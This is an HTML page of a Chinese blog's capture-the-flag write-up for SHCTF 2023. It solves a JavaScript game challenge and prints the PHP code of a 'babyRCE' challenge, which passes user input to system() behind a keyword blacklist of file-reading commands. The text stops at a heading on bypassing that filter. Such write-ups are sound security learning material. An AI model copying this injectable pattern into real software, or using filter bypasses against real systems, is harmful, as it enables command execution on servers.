
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>SHCTF 2023-wp - hybcx's blog</title>

  
    <meta name="description" content="0x01 前言 最近新生比赛太多了，一打开全是web题，看着就爽(bushi，做下来之后发现一点都不新生┭┮﹏┭┮，可能是我太菜了。但总体下来感觉每个赛事都还不错，要说最有难度的还是moectf了，很烦。但总体体验下来还是SHCTF舒服，平台绚丽、体验感也贼好等等（反正各种舒服吧），更何况还是&quot;山河CTF&quot;，我就是山河人啊┭┮﹏┭┮。话不多说开始写wp 0x02 玩转题目 先从最简单的开始吧 WE">
<meta property="og:type" content="article">
<meta property="og:title" content="SHCTF 2023-wp">
<meta property="og:url" content="http://hybcx.xyz/2023/10/02/2023shctf/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x01 前言 最近新生比赛太多了，一打开全是web题，看着就爽(bushi，做下来之后发现一点都不新生┭┮﹏┭┮，可能是我太菜了。但总体下来感觉每个赛事都还不错，要说最有难度的还是moectf了，很烦。但总体体验下来还是SHCTF舒服，平台绚丽、体验感也贼好等等（反正各种舒服吧），更何况还是&quot;山河CTF&quot;，我就是山河人啊┭┮﹏┭┮。话不多说开始写wp 0x02 玩转题目 先从最简单的开始吧 WE">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002165620335.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002165742671.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002165757359.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002165914335.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002170013762.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002170048124.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002170252784.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002170341536.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002170406433.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002171434401.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002171456572.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002171556583.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002171845988.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002171851387.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002171944121.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002172127324.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002172205055.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002172317260.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002172359170.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002174640233.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002174921001.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002180702598.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002180723398.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002180737123.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002181255572.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002181321001.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002184828011.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012181953324.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012182919003.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012182934094.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012183006466.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012183155684.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012183601848.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012183629492.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012183710342.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012185359554.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012185420218.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012185523040.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012194936775.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012195045755.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012194230363.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012194427510.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012195416427.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012195607389.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012195707915.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231012195732948.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231031171756811.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231031172924081.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231031175753915.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231031175844738.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231103195044902.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231103195829002.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231103195857003.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231103195931464.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231103201618954.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231103203437201.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231103203755216.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231103203810165.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231031181934913.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231031183614448.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231031190928323.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231031202036768.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231031202111335.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231031212206314.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231031223645605.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231031224029185.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231118225505778.png">
<meta property="article:published_time" content="2023-10-02T08:07:24.234Z">
<meta property="article:modified_time" content="2023-11-19T04:29:44.033Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="CTF赛事">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hybcx.xyz/2023/10/02/2023shctf/image-20231002165620335.png">
  
  
  
  <meta name="keywords" content="CTF赛事">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/05/05/di-shi-wu-jie-quan-qian-bei-wp/"><span class="title">第十五届圈钱杯wp</span></a><a class="item title" href="/2024/05/05/tmh-huan-chong-qu-yi-chu/"><span class="title">TMH-缓冲区溢出学习</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2024/05/02/misc-shua-ti-zhi-lu/"><span class="title">MISC-刷题之旅</span></a><a class="item title" href="/2024/03/26/gdouctf-2023/"><span class="title">GDOUCTF2023</span></a><a class="item title" href="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/"><span class="title">i春秋CTF刷题</span></a><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/03/24/shell-xue-xi/"><span class="title">shell学习</span></a><a class="item title" href="/2023/08/06/qian-xi-ssti-lou-dong/"><span class="title">浅析SSTI漏洞</span></a><a class="item title" href="/2023/11/12/flask-pin-ma-xue-xi/"><span class="title">Flask-PIN码学习</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/CTF%E8%B5%9B%E4%BA%8B/">CTF赛事</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-10-02T08:07:24.234Z">2023-10-02</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2023-11-19T04:29:44.033Z">2023-11-19</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>SHCTF 2023-wp</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="0x01-前言">0x01 前言</h1>
<p>最近新生比赛太多了，一打开全是web题，看着就爽(bushi，做下来之后发现一点都不新生┭┮﹏┭┮，可能是我太菜了。但总体下来感觉每个赛事都还不错，要说最有难度的还是moectf了，很烦。但总体体验下来还是SHCTF舒服，平台绚丽、体验感也贼好等等（反正各种舒服吧），更何况还是"山河CTF"，我就是山河人啊┭┮﹏┭┮。话不多说开始写wp</p>
<h1 id="0x02-玩转题目">0x02 玩转题目</h1>
<p>先从最简单的开始吧</p>
<h2 id="web">WEB</h2>
<h3 id="week1飞机大战">[WEEK1]飞机大战</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002165620335.png" alt="image-20231002165620335"></p>
<p>首先依旧是亲切无比的游戏，我们先点开看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002165742671.png" alt="image-20231002165742671"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002165757359.png" alt="image-20231002165757359"></p>
<p>嗯~~，非常熟悉的嘲讽，那我们按照常规思路直接审计一下相关js代码，进控制台查找</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002165914335.png" alt="image-20231002165914335"></p>
<p>进去的时候看到敏感字符score，那猜测应该是修改score以达到获取flag，我们继续跟踪score</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002170013762.png" alt="image-20231002170013762"></p>
<p>这里是一些对score的判断</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002170048124.png" alt="image-20231002170048124"></p>
<p>看到上图的时候发现是对score达到要求的函数操作，但似乎没有用的信息，于是我墨迹了一会儿想到，游戏失败会弹窗，那成功了大概率也是弹窗。凭借此思路我们可以想到是否可以找到关于"游戏胜利的处理函数"看看内部有什么信息，于是我继续找发现了won函数（类似win：胜利）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002170252784.png" alt="image-20231002170252784"></p>
<p>如图发现alert弹窗函数，以及uniccode编码字符串，那我们解码一下看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002170341536.png" alt="image-20231002170341536"></p>
<p>嗯！亲切的base64，解码即可得到flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002170406433.png" alt="image-20231002170406433"></p>
<h3 id="week1babyrce">[WEEK1]babyRCE</h3>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>

<span class="hljs-variable">$rce</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'rce'</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$rce</span>)) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\'|\"/i"</span>, <span class="hljs-variable">$rce</span>)) {
        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$rce</span>);
    }<span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"hhhhhhacker!!!"</span>.<span class="hljs-string">"\n"</span>;
    }
} <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}</code></pre>
<p>很明显的rce嘛，但是过滤了很多，这里我也是比较菜记不住那么多知识点，只是在遇到的时候在网上冲浪找相关payload，于是乎翻到了如下：</p>
<h4 id="中括号匹配绕过">[]中括号匹配绕过</h4>
